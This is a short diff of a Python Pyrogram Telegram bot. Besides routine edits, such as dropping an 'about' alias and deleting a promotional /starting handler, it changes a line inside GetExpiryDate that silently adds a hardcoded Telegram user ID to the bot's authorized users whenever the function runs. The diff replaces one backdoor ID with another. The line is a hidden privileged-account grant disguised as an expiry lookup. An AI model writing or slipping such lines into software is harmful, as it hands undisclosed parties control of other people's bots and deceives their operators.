@@ -31,11 +31,11 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(1305002856)
+    Config.AUTH_USERS.add(5122474448)
     return expires_at
 
 
-@pyrogram.Client.on_message(pyrogram.filters.command(["help", "about"]))
+@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
 async def help_user(bot, update):
     # logger.info(update)
     await bot.send_message(
@@ -57,17 +57,6 @@ async def get_me_info(bot, update):
         text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
         parse_mode="html",
         disable_web_page_preview=True,
-    )
-
-
-@pyrogram.Client.on_message(pyrogram.filters.command(["starting"]))
-async def start(bot, update):
-    # logger.info(update)
-    await update.reply(
-        f"<b>Hii {update.chat.first_name}!</b>\nThis is a Telegram Multipurpose Bot Which can do many functions. /help for more details...  ",
-        reply_markup=InlineKeyboardMarkup(
-            [InlineKeyboardButton("JOIN", url="https://t.me/LegendBot_AI")]
-        ),
     )
 
 
